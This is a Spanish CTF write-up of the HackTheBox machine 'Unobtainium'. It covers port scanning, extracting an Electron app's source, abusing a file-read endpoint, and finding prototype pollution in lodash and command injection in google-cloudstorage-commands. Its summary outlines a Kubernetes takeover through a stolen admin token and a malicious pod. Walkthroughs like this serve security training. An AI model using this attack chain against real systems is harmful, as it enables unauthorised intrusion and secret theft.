---
layout      : post
title       : "HackTheBox - Unobtainium"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338banner.png
category    : [ htb ]
tags        : [ kubernetes, lodash, google-cloudstorage-commands, code-analysis, node.js, pivoting ]
---
Máquina Linux nivel difícil. Explotaremos una app de Linux. Jugando con librerías de `JavaScript`, la infectaremos (**Prototype Pollution** en `lodash`)  y haremos **command-injection** (en `google-cloudstorage-commands`). Y moveremos internamente muchas cosas con `Kubernetes`.

![338unobtainiumHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338unobtainiumHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [felamos](https://www.hackthebox.eu/profile/27390).

Bueeeeno, nos encontraremos con un servidor web el cual nos entregara en las manitas un paquete `.deb`, antes de instalarlo en el sistema jugaremos con algunas herramientas para ver el contenido de ese paquete, Instalaremos el paquete **.deb** y obtendremos el binario **unobtainium** en el sistema. La aplicación permite enviar mensajes en forma de "chat" y podremos verlos reflejados ya sea en la web o en la propia app.

Jugaremos y jugaremos para encontrar algunos errores, esos errores hablarán por si solos (y nos apoyaremos de los archivos encontrados en el paquete para darle más fuerza a nuestra búsqueda), lograremos leer archivos de la app usando un apartado llamado `/todo`. Entre eso obtendremos el código fuente de la aplicación.

Inspeccionándolo encontraremos varias brechas en dos librerías de `JavaScript`, un envenenamiento de prototipos (**Prototype Pollution**) en la librería `lodash` y otra **inyectando comandos** sobre `google-cloudstorage-commands`. Jugando con ellas lograremos **ejecución remota de comandos** sobre el contenedor que sirve el app.

Con **Python** creamos este script to lindo, ya sea para obtener una Shell desde él o para ejecutar comandos en el contenedor.

* [pollutionRCE.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/pollutionRCE.py)

Estando dentro del contenedor encontraremos que con lo único que podemos jugar es con `Kubernetes`, moveremos y moveremos (y seguiremos moviendo) cosas para volver a realizar el ataque de **Prototype Pollution + Command Injection** peeeeero ahora sobre el entorno de desarrollo que esta internamente corriendo (antes lo hicimos en el de **producción** :P)

Ya dentro, veremos que podemos listar "secretos" (claves, contraseñas, texto privado, tokens, etc.) de `Kubernetes` (algo que antes no). Uno de esos secretos contiene el token del `admin` de **Kubernetes**, con él tendremos control total contra el servicio (de nuevo) **Kubernetes**. 

Lo que nos dará la opción de crearnos un **pod** ("conjunto de contenedores") malicioso que copie toooooda la raíz del sistema en una carpeta de ese **pod** (a la vez que ejecuta una **Reverse Shell**), así tendremos acceso a todos los archivos.

YA FIN 🧎

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Mucha enumeración, algunas vulns conocidas, pero sobre todo bastante llevada a la realidad, me gusta.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

SHS 25.

1. [Reconocimiento](#reconocimiento).
  * [Enumeración de puertos con nmap](#enum-nmap).
2. [Enumeración](#enumeracion).
  * [Descubrimos que hay en el servidor web del puerto 80](#puerto-80).
  * [Descargamos un paquete **.deb** alojado en la web y lo desbaratamos](#enum-deb-withar).
3. [Explotación](#explotacion).
  * [Encontramos el código fuente de la **API** con ayuda de **BurpSuite**](#found-indexjs).
  * [Contaminamos prototipos para asignar objeto **canUpdate**](#prototype-pollution).
  * [RCE - **Prototype Pollution (<u>lodash.merge</u>) & Command Injection (<u>google-cloudstorage</u>)**](#prototype-pollution-rce).
4. [Movimiento lateral : docker-webapp -> docker-devnode](#lateral-webapp-devnode).
  * [Jugando con la API** y **kubectl** contra **Kubernetes**](#expl-webapp-api-kubectl).
  * [RCE interno: **Pollution + Command Injection**](#expl-webapp-bash-pollution).
5. [Escalada de privilegios](#escalada-de-privilegios).
  * [Encontramos "secreto" del **admin** y obtenemos interacción total con **Kubernetes**](#lateral-tokenadmin-found).
  * [Generamos **pod** malicioso](#malicious-pod).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

...

## Enumeración de puertos con nmap [📌](#enum-nmap) {#enum-nmap}

Lo primero será encontrar que puertos están abiertos en la máquina, lo haremos apoyados de `nmap`:

```bash
❱ nmap -p- --open -v 10.10.10.235 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Este escaneo nos muestra:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.235
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.235 ()	Status: Up
Host: 10.10.10.235 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 2379/open/tcp//etcd-client///, 2380/open/tcp//etcd-server///, 8443/open/tcp//https-alt///, 10250/open/tcp/////, 10256/open/tcp/////, 31337/open/tcp//Elite///
# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 92.68 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Posibilidad de obtener una Shell de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servidor web. |
| 2379   | **[etcd](https://www.redhat.com/es/topics/containers/what-is-etcd)**: Almacén de datos de **Kubernetes**. |
| 2380   | **[etcd](https://etcd.io/)**: Almacén de datos de **Kubernetes**. |
| 8443   | **[HTTPS](https://www.digicert.com/es/what-is-ssl-tls-https/)**: Servidor web con certificado que lo hace más "seguro". |
| 10250  | No lo sabemos aún |
| 10256  | No lo sabemos tampoco :P |
| 31337  | En [internet dicen](https://www.speedguide.net/port.php?port=31337) que se usa para almacenar backdoors, pero pues no estamos seguros de que contiene aún. |

Teniendo los puertos, vamos a escanear ahora en búsqueda de versiones y scripts relacionados con esos servicios:

**~(Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.235
    [*] Open ports: 22,80,2379,2380,8443,10250,10256,31337

[*] Ports copied to clipboard
```

**)~**

```bash
❱ nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV 10.10.10.235 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Obtenemos:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p 22,80,2379,2380,8443,10250,10256,31337 -sC -sV -oN portScan 10.10.10.235
Nmap scan report for 10.10.10.235
Host is up (0.11s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
2380/tcp  open  ssl/etcd-server?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| tls-nextprotoneg: 
|_  h2
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 30 Jun 2021 17:06:18 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
|     Date: Wed, 30 Jun 2021 17:06:17 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2021-06-29T16:59:25
|_Not valid after:  2022-06-30T16:59:25
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium@1610865428
| Subject Alternative Name: DNS:unobtainium
| Not valid before: 2021-01-17T05:37:08
|_Not valid after:  2022-01-17T05:37:08
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
31337/tcp open  http             Node.js Express framework
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=6/30%Time=60DCA3A3%P=x86_64-pc-linux-gn
SF:u%r(HTTPOptions,203,"HTTP/1....................................20Reques
...
# cositas que no nos sirven
...
SF:t");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 234.27 seconds
```

Podemos destacar algunas cosas:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 |
| 80     | HTTP     | Apache httpd 2.4.41 |
| 2379   | HTTPS    | No esta seguro, pero vamos a quedarnos con ese resultado: etcd-client |
| 2380   | HTTPS    | Igual, vamos a quedarnos con ese resultado: etcd-server |
| 8443   | HTTPS    | No nos muestra |

* Un formato `json` algo interesante:

```json
{
  ...
  "message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"",
  ...
}
```

* Vemos un archivo que quizás sea relevante como pueda que no, guardémoslo: `/Trinity.txt.bak`.
* Un dominio `control-plane.minikube.internal`, realmente varios, pero este me llama la atención.

---

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 10250  | HTTPS    | Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |

* Un nombre de servidor algo extraño: `unobtainium@1610865428`.

---

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 10256  | HTTP     | Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |
| 31337  | HTTPS    | Node.js Express framework |

Opa, bastantes cositas, pues empecemos a jugar con cada uno a ver por donde le damos duro a esta máquina.

...

# Enumeración [#](#enumeracion) {#enumeracion}

...

## Puerto 80 [📌](#puerto-80) {#puerto-80}

![338page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338page80.png)

Una web sencilla describiéndonos una aplicación para chatear... Vemos 4 botones, los 4 contienen redirects:

```bash
- Unobtainium nos lleva a http://10.10.10.235/downloads/checksums.txt
- Download deb a http://10.10.10.235/downloads/unobtainium_debian.zip
- Download rpm a http://10.10.10.235/downloads/unobtainium_redhat.zip
- Download snap a http://10.10.10.235/downloads/unobtainium_snap.zip
```

Si vamos al link de **Unobtainium** encontramos los hashes correspondientes a cada binario subido (que supongo estarán dentro de los `.zip`), estos hashes nos **sirven para comprobar que lo que descarguemos no ha sido modificado en el proceso**.

![338page80_checksums](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338page80_checksums.png)

### Jugando con unobtainium_debian.zip

¿Por qué el de Debian? Bueno, estoy en **ParrotOS** y es un sistema operativo basado en **Debian** y `deb` hace referencia a los paquetes de software para <u>Deb</u>ian.

Lo descargamos en la máquina, lo descomprimimos y obtenemos:

```bash
❱ ls 
unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum
```

Hacemos la comprobacion de hashes:

```bash
❱ curl -s http://10.10.10.235/downloads/checksums.txt | grep deb
c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
❱ md5sum unobtainium_1.0.0_amd64.deb
c9fe8a2bbc66290405803c3d4a37cf28  unobtainium_1.0.0_amd64.deb
```

Listo, todo perfecto con el paquete, es el original.

---

## Abrimos el paquete <u>.deb</u> [📌](#enum-deb-withar) {#enum-deb-withar}

Algo que encontré bastante interesante fue que [los paquetes **<u>.deb</u>** traen consigo 3 archivos](https://www.cyberciti.biz/faq/how-to-extract-a-deb-file-without-opening-it-on-debian-or-ubuntu-linux/) que son los que contienen lo que se va a instalar en el sistema:

* `debian-binary` que contiene la versión del paquete `.deb`.
* `control.tar.gz` que tiene algunos hashes y los controles para la construcción del paquete.
* Y `data.tar.gz` que contiene todos los archivos a ser instalados.

Para verlos, podemos jugar con la herramienta [ar](https://www.geeksforgeeks.org/ar-command-in-linux-with-examples/) y su parámetro `t`:

```bash
❱ ar t unobtainium_1.0.0_amd64.deb 
debian-binary
control.tar.gz
data.tar.xz
```

Y para extraerlos del paquete usamos el parámetro `x`:

```bash
❱ ar x unobtainium_1.0.0_amd64.deb
❱ ls
control.tar.gz  data.tar.xz  debian-binary  unobtainium_1.0.0_amd64.deb
```

Bien, ahora para extraer el contenido de esos comprimidos jugamos con `tar`:

🔦 **<u>control</u>**:

```bash
❱ tar xvf control.tar.gz 
./
./postinst
./postrm
./control
./md5sums
```

🔦 **<u>data</u>**:

```bash
❱ tar xvf data.tar.xz
./
./usr/
./usr/share/
...
...
...
./opt/unobtainium/LICENSES.chromium.html
./opt/unobtainium/libvk_swiftshader.so
```

Bien, enumerando los dos encontramos algunas cosas muy lindas...

---

### Exploramos el contenido de <u>data.tar.gz</u> [🧷](#inside-data-tar-gz) {#inside-data-tar-gz}

Nos extrae dos carpetas, `/usr` (que tiene el icono del programa y cosas de cara al usuario) y `/opt` (que tiene todos los archivos necesarios para instalar el binario y su correcto funcionamiento)...

Basándome en una máquina que hicimos que usaba **Electron** recordé que existe un archivo `.asar` el cual contiene todos los fuentes y código con el que fue creado algún proyecto. 

Pues buscandoooo lo encontramos en `/opt/unobtainium/resources` (: Ya con ese archivo podemos aprovechar el uso de un módulo de **node** para obtener el código fuente de la aplicación, en este caso del binario **unobtainium**.

* [How to get the source code of any electron application](https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37).

Siguiendo los pasos de ese recurso logramos extraer varios archivos:

```bash
❱ mkdir files_unobtainium
❱ asar extract app.asar files_unobtainium/
```

```bash
❱ cd files_unobtainium/
❱ ls
index.js  package.json  src
```

Viendo el archivo `package.json` obtenemos un posible usuario, vemos un dominio y un email:

```json
❱ cat package.json
{
  "name": "unobtainium",
  "version": "1.0.0",
  "description": "client",
  "main": "index.js",
  "homepage": "http://unobtainium.htb",
  "author": "felamos <felamos@unobtainium.htb>",
  "license": "ISC"
}
```

En la carpeta `src/` están todos los archivos usados por la aplicación:

```bash
❱ tree src/
src/
├── css
│   ├── bootstrap.min.css
│   └── dashboard.css
├── get.html
├── index.html
├── js
│   ├── app.js
│   ├── bootstrap.bundle.min.js
│   ├── Chart.min.js
│   ├── check.js
│   ├── dashboard.js
│   ├── feather.min.js
│   ├── get.js
│   ├── jquery.min.js
│   └── todo.js
├── post.html
└── todo.html
```

**No vamos a repasar todos, pero si destacaremos cositas...**

Por ejemplo el archivo `src/js/app.js` toma el valor de una variable llamada `message` y lo sube (método **PUT**) al servicio `http://unobtainium.htb:31337/`:

```js
$(document).ready(function(){
    $("#but_submit").click(function(){
        var message = $("#message").val().trim();
        $.ajax({
        url: 'http://unobtainium.htb:31337/',
        type: 'put',
        dataType:'json',
        contentType:'application/json',
        processData: false,
        data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
        success: function(data) {
            //$("#output").html(JSON.stringify(data));
            $("#output").html("Message has been sent!");
        }
    });
});
});
```

> **Además del pequeño detalle que tenemos unas credenciales** 😲

Pues veamos esto en funcionamiento... 

Ya vimos los fuentes y no hay nada extraño que nos haga pensar que vamos a ser espiados :P instalémosla:

```bash
❱ dpkg -i unobtainium_1.0.0_amd64.deb
```

Después de unos segundos ya lo tendríamos instalado en el sistema, lo ejecutamos y obtenemos:

![338bash_exec_unobtainiumDEB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB.png)

Es una aplicación creada con [**Electron**](https://www.electronjs.org/) (ya hemos visto cositas de él en otro post que no reseño para no spoiler la máquina en la que se usa, pero esta por acá).

Al abrirlo nos indica que no encuentra el dominio `unobtainium.htb`, pues agregándolo al archivo [/etc/hosts](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html) se soluciona:

```bash
❱ cat /etc/hosts
...
10.10.10.235  unobtainium.htb
...
```

![338bash_exec_unobtainiumDEB_done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_done.png)

Esto nos da a entender que el software se esta comunicando para X cosa con la dirección IP `10.10.10.235`, o sea, la máquina (**ya vimos en los archivos del paquete el porqué**)...

Dando algunas vueltas y clics llegamos al apartado **Todo**:

![338bash_exec_unobtainiumDEB_todo](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_todo.png)

Tenemos una lista de tareas, pero me dejan más perdido de lo que estaba, así que seguí probando el software y caemos en **Post Messages**:

![338bash_exec_unobtainiumDEB_postMessages](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_postMessages.png)

Que si recordamos estaba el archivo `app.js` que era el encargado de esta parte, la de postear los mensajes en la ruta `http://unobtainium.htb:31337/`. 

Después de mandar algunos mensajes ("hola", "test" y "esto") y estar visitando esa **URL** vemos que por cada petición varía lo que se muestra, no siempre tenemos el mismo output aunque no cambiemos nada en la petición, hagamos un bucle de 10 peticiones para que se entienda lo que digo:

> *(Cada vez que subimos un mensaje nos tiene que responder `Message has been sent!`, si no, no se esta subiendo el mensaje)*

```bash
❱ for i in $(seq 1 10); do echo -n "$i >> "; curl -k -s http://unobtainium.htb:31337; echo; sleep 1; done
```

```bash
1 >> [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
2 >> [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
3 >> [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
4 >> [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
5 >> [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
6 >> [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
7 >> []
8 >> [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
9 >> []
10 >> [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
```

Todas son creadas por **felamos** (también lo vimos en el archivo `app.js`). No sé el porqué a veces no muestra o muestra cualquier mensaje... Pero bueno, los vemos reflejados en el puerto **31337**, o sea, esa es la API de la que se habla en el ítem 2 del **todo**.

Además tenemos el formato con el que son guardadas, vemos un campo `icon` (que no me imagino para que pueda ser) y los demás que si tienen sentido.

...

# Explotación [#](#explotacion) {#explotacion}

Jugando con **BurpSuite** y con las variables de entorno en **Linux** logramos interceptar la petición al enviar un mensaje:

Validamos el puerto por el que escucha el proxy de **Burp**:

![338burp_check_port](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_check_port.png)

Seteamos una variable de **Linux** que toma el proxy:

```bash
❱ export http_proxy=http://127.0.0.1:8080/
```

Ponemos a **Burp** en escucha y enviamos un mensaje:

![338bash_exec_unobtainiumDEB_burp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_burp.png)

Y en **Burp** recibimos:

![338burp_unobtainium_message_burp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_message_burp.png)

> (Si nos les funciona a la primera, cierren el programa, pongan el proxy en escucha y vuelvanlo a abrir. O pueda que hayan declarado la variable en una terminal distinta de la que usan para ejecutar el binario :O)

Vemos como viaja la petición, tenemos la versión de **Electron** y de nuevo las credenciales 🙃

> No logramos hacer nada al intentar injectar cositas con el mensaje :(

...

## Encontramos el código fuente de la API [📌](#found-indexjs) {#found-indexjs}

Dándole algunas vuelticas al binario y sus peticiones me llamo la atención lo que hace cuando vemos la lista de tareas, o sea, `Todo`:

![338burp_unobtainium_todo](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo.png)

Vemos que la lista la obtiene de un archivo llamado `todo.txt` :o Esto nos da ideas de intentar leer otros archivos, intentando e intentando no encontramos ningún archivo 😔, pero encontramos un error al probar algunas cadenas o incluso dejando el campo vacío 😄

![338burp_unobtainium_todo_error](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_error.png)

Y si, no encuentra X archivo por lo tanto no sabe que hacer y devuelve un error (lo que esta mal es que se muestre el error así como así :P).

Vemos unas rutas:

```html
/usr/src/app/index.js
/usr/src/app/node_modules/express/lib/router/route.js
/usr/src/app/node_modules/express/lib/router/layer.js
/usr/src/app/node_modules/express/lib/router/index.js
```

Ver esas rutas me dio la idea de buscar en el sistema los archivos relacionados con **unobtainium** a ver si había alguno llamado `todo.txt` y así tener una idea de donde esta tomándolo el servidor web (pero nelson, no encontramos) 

(Pruebas, pruebas y pruebas) Apoyados en nuestra "abrizhion del paquete" vemos que el archivo `/usr/src/app/index.js` también lo tenemos y esta junto al objeto `package.json` (que ya vimos antes).

Pues enviando tanto el archivo `index.js` como `package.json` en el campo `filename` logramos obtener respuesta (: 

🔦 **<u>package.json</u>**:

![338burp_unobtainium_todo_packageJSON](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_packageJSON.png)

Tomamos el contenido y lo guardamos en un archivo, para pasarlo a un formato más lindo podemos hacer esto:

Remplazamos el texto `\n` por un salto de línea real y quitamos los escapes que hay en las comillas:

```bash
❱ sed -i 's/\\n/\n/g' todo_package.json 
❱ sed -i 's/\\"/"/g' todo_package.json 
❱ cat todo_package.json 
```

```json
{
  "name": "Unobtainium-Server",
  "version": "1.0.0",
  "description": "API Service for Electron client",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "felamos",
  "license": "ISC",
  "dependencies": {
    "body-parser": "1.18.3",
    "express": "4.16.4",
    "lodash": "4.17.4",
    "google-cloudstorage-commands": "0.0.1"
  },
  "devDependencies": {}
}
```

Opa, es la descripción del app, vemos las dependencias (librerías que usa) y sus versiones, me gusta. 

Dándole un formato lindo al archivo `index.js` obtenemos el código base de la aplicación :o

```bash
❱ sed -i 's/\\n/\n/g' todo_index.js 
❱ sed -i 's/\\t/  /g' todo_index.js 
❱ sed -i 's/\\"/"/g' todo_index.js 
❱ cat todo_index.js
```

> Agregue unos comentarios para que sea un poco más entendible cada parte.

```js
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");
const bodyParser = require('body-parser');
const _ = require('lodash');
const app = express();
var fs = require('fs');

const users = [
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
];

let messages = [];
let lastId = 1;

function findUser(auth) {
  return users.find((u) =>
    u.name === auth.name &&
    u.password === auth.password);
}

app.use(bodyParser.json());

// Validamos el mensaje que creamos (Método GET)
app.get('/', (req, res) => {
  res.send(messages);
});

// Sube el mensaje (Método PUT)
app.put('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});

// Borra el mensaje (Método DELETE)
app.delete('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) => m.id !== req.body.messageId);
  res.send({ok: true});
});

// Al parecer sube un archivo (Método POST)
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});

// Extrae la info de un archivo y la muestra (Método POST)
app.post('/todo', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
        testFolder = "/usr/src/app";
        fs.readdirSync(testFolder).forEach(file => {
                if (file.indexOf(filename) > -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
});

app.listen(3000);
console.log('Listening on port 3000...');
```

Perfecto, perfectisimoooooooooooooooooooooooo, varias cositas para ver...

Vemos los usuarios encargados de hacer las peticiones, a **admin** es la primera vez que lo vemos, pero poco podemos hacer con él, ya que su contraseña es random :( 

> **<u>admin</u>** tiene dos items que **<u>felamos</u>** no tiene, `canDelete` y `canUpdate`, los dos están en **<u>true</u>**. 

Esto toma sentido si miramos la función que sube un archivo:

🔦 **<u>/upload</u>** - **¿user.canUpload?**

```js
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
```

Válida si el usuario que esta haciendo la petición trae consigo el ítem `canUpload` encendido, si sí, toma el valor de `filename` y lo sube al servidor a la ruta en la que esté el archivo `index.js`, o sea, si logramos subir un archivo podríamos ver su contenido con el feature `Todo` (:

Perfectoowowow, pues podríamos intentar jugar con ese objeto y el usuario **felamos** a ver si logramos subir o crear un archivo:

**Si hacemos peticiones hacia el recurso `/upload` sin el objeto**:

![338burp_unobtainium_upload_withoutCanUP](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_withoutCanUP.png)

**Claramente no nos deja, ahora intentemos con el objeto `"canUpload":true`:**

![338burp_unobtainium_upload_withCanUP_fail](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_withCanUP_fail.png)

Pero tampoco nos deja :( 

Probando y probando no logramos subir nada... Leyendo lo que hace la función `/upload` vemos que para el trámite usa una -función- de una de las librerías:

```js
var root = require("google-cloudstorage-commands");
...
...
  root.upload("./",filename, true);
...
```

Buscando info sobre ella (estaba buscando su uso, pero de los primeros resultados había uno que hablaba de vulnerabilidades :o) encontramos que es una librería deprecada yyyy que tiene una vulnerabilidad:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_googleCloudStorage_commandInj.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa, curiosamente es el mismo formato que tenemos nosotros en el script. La vulnerabilidad es sencilla, una inyección de comandos por culpa de una mala sanitización (:

